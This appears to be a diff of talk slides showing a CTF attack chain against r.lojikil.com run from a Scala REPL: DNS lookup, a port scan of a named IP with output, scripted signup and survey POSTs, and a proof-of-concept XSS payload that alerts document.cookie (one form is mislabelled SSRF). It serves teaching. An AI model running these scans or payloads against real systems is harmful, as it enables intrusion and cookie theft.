@@ -235,7 +235,8 @@ def queryInternal(dom: String,
 # Attacks == Models mod harm
 
 - Attack: `foldNames("somedomain.com", domainPrefixs) andThen lookupDomains`
-- Model: `readBIND("/var/named/chroot/var/named/...")`
+- Model: Extract types & values from above attack
+- (alternative) Model: `readBIND("/var/named/chroot/var/named/...")`
 - `val result : List[DNSRecord] = ...`
 - Apply standard validation/testing across both
 
@@ -258,12 +259,72 @@ there is a CTF on r.lojikil.com **somewhere**, here is your attack chain:
 1. HTTPOnly cookie theft
 
 ---
+# Discovery/Recon
+
+```
+scala> val hosts = queryInternal("r.lojikil.com").get
+hosts: Array[DNSRecord] = Array(DNSCNameRecord(-1,,r.lojikil.com,IPv4(45.76.9.79)))
+scala> val services = scanInternal(hosts.map(x => 
+new Location(x.address, Some(x))), ProtocolTCP).get
+[!] scanning 45.76.9.79 port 1
+[!] scanning 45.76.9.79 port 7
+[!] scanning 45.76.9.79 port 9
+[!] scanning 45.76.9.79 port 21
+[!] scanning 45.76.9.79 port 22
+added open port
+<snip ...>
+[!] scanning 45.76.9.79 port 8080
+added open port
+[!] scanning 45.76.9.79 port 8088
+<snip ...>
+services: Option[Array[Service]] = Some([LService;@3ccfac20)
+
+```
+
+---
+# Discovery/Recon
+
+```
+scala> val target = services(1)
+scala> httpGet(target, "/")
+scala> val response = res32.get
+scala> response.statusline
+res34: String = HTTP/1.0 303 See Other
+scala> response.headers("Location")
+res35: String = http://r.lojikil.com/login
+```
+
+---
 
 # My model/attack
 
 ```
+val signupRes = httpPost(target, "/signup", "HTTP/1.1", 
+None, None, Some(Map("user" -> "stefan", 
+"password" -> "hunter2", "confirmp" -> "hunter2")),
+Some(Map("Referer" -> "http://r.lojikil.com:8080")))
+val cookieJar = signupRes.cookies
+val attackRes = httpPost(target, "/survey", "HTTP/1.1",
+Some(cookieJar), None, Some(Map("survey" -> ...)),
+Some(Map("Referer" -> "http://r.lojikil.com:8080")))
 
 ```
+
+---
+
+# Working Payload
+
+- SSRF:
+
+```
+<form method="POST" action="/search">
+    <input type="hidden" name="q" 
+    value="<a href='#' onclick='alert(document.cookie)'>test</a>">
+    <input type="submit" value="Search!">
+</form>
+```
+- XSS:
+`<a href='#' onclick='alert(document.cookie)'>test</a>`
 
 ---
 
